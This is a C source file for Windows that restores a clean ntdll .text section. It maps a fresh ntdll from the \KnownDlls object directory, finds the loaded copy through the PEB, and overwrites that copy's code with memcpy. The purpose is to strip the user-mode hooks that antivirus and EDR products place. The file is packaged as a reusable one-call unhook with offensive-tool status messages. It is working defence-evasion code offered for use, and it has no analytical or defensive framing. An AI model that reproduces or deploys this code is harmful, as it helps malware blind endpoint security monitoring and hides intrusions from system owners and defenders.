#include <windows.h>
#include <stdio.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI* fnNtOpenSection)(
	PHANDLE          SectionHandle,
	ACCESS_MASK      DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes
);

// Reusable PE helpers

static PVOID GetNtdllBaseFromPEB(void)
{
#ifdef _WIN64
	PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
	PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif
	PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)(
		(PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10
	);
	return pLdr->DllBase;
}

static BOOL FindSection(PVOID pModule, const char *name, PVOID *ppBase, SIZE_T *pSize)
{
	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModule;
	if (pDos->e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;

	PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)pModule + pDos->e_lfanew);
	if (pNt->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;

	PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
	for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
		if (strncmp((char *)pSec[i].Name, name, IMAGE_SIZEOF_SHORT_NAME) == 0) {
			*ppBase = (PVOID)((ULONG_PTR)pModule + pSec[i].VirtualAddress);
			*pSize  = pSec[i].Misc.VirtualSize;
			return TRUE;
		}
	}
	return FALSE;
}

// KnownDlls mapping

static BOOL MapFromKnownDlls(const WCHAR *dllName, PVOID *ppMapping)
{
	WCHAR path[128];
	wsprintfW(path, L"\\KnownDlls\\%s", dllName);

	UNICODE_STRING uniStr = { 0 };
	uniStr.Buffer        = path;
	uniStr.Length         = (USHORT)(wcslen(path) * sizeof(WCHAR));
	uniStr.MaximumLength  = uniStr.Length + sizeof(WCHAR);

	OBJECT_ATTRIBUTES oa;
	InitializeObjectAttributes(&oa, &uniStr, OBJ_CASE_INSENSITIVE, NULL, NULL);

	fnNtOpenSection pNtOpenSection = (fnNtOpenSection)GetProcAddress(
		GetModuleHandleW(L"ntdll.dll"), "NtOpenSection"
	);
	if (!pNtOpenSection)
		return FALSE;

	HANDLE hSection = NULL;
	NTSTATUS status = pNtOpenSection(&hSection, SECTION_MAP_READ, &oa);
	if (status != 0) {
		printf("[-] NtOpenSection: 0x%08lX\n", status);
		return FALSE;
	}

	*ppMapping = MapViewOfFile(hSection, FILE_MAP_READ, 0, 0, 0);
	CloseHandle(hSection);

	if (!*ppMapping) {
		printf("[-] MapViewOfFile: %lu\n", GetLastError());
		return FALSE;
	}
	return TRUE;
}

// Section replacement (the actual unhook)

static BOOL ReplaceSectionFromClean(PVOID pHooked, PVOID pClean, const char *section)
{
	PVOID  pHookedSec = NULL, pCleanSec = NULL;
	SIZE_T hookedSize = 0,    cleanSize = 0;

	if (!FindSection(pHooked, section, &pHookedSec, &hookedSize) ||
	    !FindSection(pClean,  section, &pCleanSec,  &cleanSize))
		return FALSE;

	if (hookedSize != cleanSize)
		return FALSE;

	// sanity: first bytes should match (both are .text of the same DLL)
	if (*(ULONG *)pHookedSec != *(ULONG *)pCleanSec)
		return FALSE;

	DWORD oldProt = 0;
	if (!VirtualProtect(pHookedSec, hookedSize, PAGE_EXECUTE_WRITECOPY, &oldProt)) {
		printf("[-] VirtualProtect: %lu\n", GetLastError());
		return FALSE;
	}

	memcpy(pHookedSec, pCleanSec, hookedSize);
	VirtualProtect(pHookedSec, hookedSize, oldProt, &oldProt);
	return TRUE;
}

// Public API: one-call unhook

BOOL UnhookNtdll(void)
{
	PVOID pClean = NULL;
	if (!MapFromKnownDlls(L"ntdll.dll", &pClean))
		return FALSE;

	PVOID pHooked = GetNtdllBaseFromPEB();
	BOOL  ok = ReplaceSectionFromClean(pHooked, pClean, ".text");

	UnmapViewOfFile(pClean);
	return ok;
}

int main(void)
{
	printf("[*] Unhooking ntdll via KnownDlls...\n");

	if (!UnhookNtdll()) {
		printf("[-] Failed\n");
		return 1;
	}

	printf("[+] ntdll .text section restored\n");
	return 0;
}
